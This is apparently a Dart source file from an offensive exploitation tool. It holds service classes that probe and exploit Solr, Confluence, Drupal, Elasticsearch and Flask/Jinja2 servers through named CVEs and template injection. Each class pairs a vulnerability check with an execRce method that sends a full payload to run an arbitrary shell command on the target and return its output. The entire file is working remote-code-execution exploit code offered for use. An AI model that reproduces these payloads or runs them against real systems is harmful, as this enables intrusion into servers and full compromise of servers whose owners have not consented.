import 'dart:convert';

import 'package:http/http.dart' as http;

import 'exp_result.dart';

class SolrExpService {
  final String baseUrl;
  final String coreName;
  final Duration timeout;

  SolrExpService({
    required this.baseUrl,
    this.coreName = 'demo',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final listenerPayload = jsonEncode({
        'add-listener': {
          'event': 'postCommit',
          'name': 'matrix_check_54289',
          'class': 'solr.RunExecutableListener',
          'exe': 'sh',
          'dir': '/bin/',
          'args': ['-c', 'echo solr_check_54289'],
        },
      });
      final configRes = await http
          .post(
            Uri.parse('$_base/solr/$coreName/config'),
            headers: {'Content-Type': 'application/json'},
            body: listenerPayload,
          )
          .timeout(timeout);
      final updateRes = await http
          .post(
            Uri.parse('$_base/solr/$coreName/update'),
            headers: {'Content-Type': 'application/json'},
            body: '[{"id":"check_trigger_54289"}]',
          )
          .timeout(timeout);

      if ((configRes.statusCode == 200 || configRes.statusCode == 201) &&
          (updateRes.statusCode == 200 || updateRes.statusCode == 201)) {
        return ExpResult(
          true,
          'CVE-2017-12629',
          'config + update 触发链路可达，疑似可利用',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-12629', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final listenerPayload = jsonEncode({
        'add-listener': {
          'event': 'postCommit',
          'name': 'matrix_exploit',
          'class': 'solr.RunExecutableListener',
          'exe': 'bash',
          'dir': '/bin/',
          'args': ['-c', cmd],
        },
      });
      await http
          .post(
            Uri.parse('$_base/solr/$coreName/config'),
            headers: {'Content-Type': 'application/json'},
            body: listenerPayload,
          )
          .timeout(timeout);

      await http
          .post(
            Uri.parse('$_base/solr/$coreName/update'),
            headers: {'Content-Type': 'application/json'},
            body: '[{"id":"rce_trigger"}]',
          )
          .timeout(timeout);

      final commitRes = await http
          .get(Uri.parse('$_base/solr/$coreName/update?commit=true'))
          .timeout(timeout);
      return '命令已发送 (commit 状态: ${commitRes.statusCode})。注意：Solr RCE 无回显，请用 OOB 或写文件验证。';
    } catch (_) {
      return null;
    }
  }
}

class ConfluenceExpService {
  final String baseUrl;
  final Duration timeout;

  ConfluenceExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  // label 是 Velocity 模板注入点，必须携带完整的 OGNL 上下文建立 payload，
  // x 参数才会被 findValue 作为 OGNL 表达式执行。
  static const _labelPayload =
      "'+#request['.KEY_velocity.struts2.context'].internalGet('ognl').findValue(#parameters.x[0],{})";

  Future<ExpResult> check() async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/template/aui/text-inline.vm'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: {
              'label': _labelPayload,
              'x': '@freemarker.template.utility.Execute@exec({"echo","confluence_54289"})',
            },
          )
          .timeout(timeout);
      if (res.body.contains('confluence_54289')) {
        return ExpResult(true, 'CVE-2023-22527', 'OGNL 注入验证通过，回显 confluence_54289');
      }
      if (res.statusCode == 200 || res.statusCode == 400) {
        return ExpResult(
          true,
          'CVE-2023-22527',
          '端点可访问 (${res.statusCode})，OGNL 注入可能存在',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2023-22527', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      // Escape double quotes so the cmd survives inside the FreeMarker string literal.
      final escaped = cmd.replaceAll(r'\', r'\\').replaceAll('"', r'\"');
      final res = await http
          .post(
            Uri.parse('$_base/template/aui/text-inline.vm'),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: {
              'label': _labelPayload,
              'x': '@freemarker.template.utility.Execute@exec({"bash","-c","$escaped"})',
            },
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

class DrupalExpService {
  final String baseUrl;
  final Duration timeout;

  DrupalExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      const payload =
          'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id';
      final res = await http
          .post(
            Uri.parse(
              '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
            ),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: payload,
          )
          .timeout(timeout);
      if (res.body.contains('uid=') ||
          (res.statusCode == 200 && res.body.contains('['))) {
        return ExpResult(
          true,
          'CVE-2018-7600 (Drupalgeddon2)',
          '端点响应，Form API #post_render 注入可能存在',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2018-7600 (Drupalgeddon2)', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      // Pass body as a Map so http.dart URL-encodes each value; avoids cmd
      // containing '&', '=', or '#' breaking the form field boundaries.
      final res = await http
          .post(
            Uri.parse(
              '$_base/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax',
            ),
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: {
              'form_id': 'user_register_form',
              '_drupal_ajax': '1',
              'mail[#post_render][]': 'exec',
              'mail[#type]': 'markup',
              'mail[#markup]': cmd,
            },
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}

class ElasticsearchExpService {
  final String baseUrl;
  final Duration timeout;

  ElasticsearchExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final payload = jsonEncode({
        'size': 1,
        'script_fields': {
          'result': {'script': 'def cmd="echo 54289"; def res=cmd.execute().text; res'},
        },
      });
      final res = await http
          .post(
            Uri.parse('$_base/_search?pretty'),
            headers: {'Content-Type': 'application/json'},
            body: payload,
          )
          .timeout(timeout);
      if (res.body.contains('54289')) {
        return ExpResult(true, 'CVE-2015-1427', 'Groovy 沙箱逃逸，echo 54289 验证通过');
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2015-1427', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      // Build the Groovy script with the command as a Groovy list to avoid
      // any quoting issues (ES 1.x Groovy accepts GString list execution).
      final cmdBytes = cmd.codeUnits.join(',');
      final payload = jsonEncode({
        'size': 1,
        'script_fields': {
          'result': {
            'script':
                "def cmd=new String([$cmdBytes] as byte[]);"
                "def res=cmd.execute().text; res",
          },
        },
      });
      final res = await http
          .post(
            Uri.parse('$_base/_search?pretty'),
            headers: {'Content-Type': 'application/json'},
            body: payload,
          )
          .timeout(timeout);
      if (res.statusCode == 200) {
        try {
          final decoded = jsonDecode(res.body);
          final hits = decoded['hits']?['hits'] as List?;
          if (hits != null && hits.isNotEmpty) {
            return hits.first['fields']?['result']?.first?.toString() ?? res.body;
          }
        } catch (_) {}
        return res.body;
      }
    } catch (_) {}
    return null;
  }
}

class FlaskSstiExpService {
  final String baseUrl;
  final String paramName;
  final Duration timeout;

  FlaskSstiExpService({
    required this.baseUrl,
    this.paramName = 'name',
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Future<ExpResult> check() async {
    try {
      final url = '$_base/?$paramName={{233*233}}';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      if (res.body.contains('54289')) {
        return ExpResult(true, 'Flask/Jinja2 SSTI', 'SSTI 存在，233×233=54289 验证通过');
      }
    } catch (_) {}
    return const ExpResult(false, 'Flask/Jinja2 SSTI', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final payload =
          "{{request.application.__globals__.__builtins__.__import__('os').popen('$cmd').read()}}";
      final url = '$_base/?$paramName=${Uri.encodeComponent(payload)}';
      final res = await http.get(Uri.parse(url)).timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}
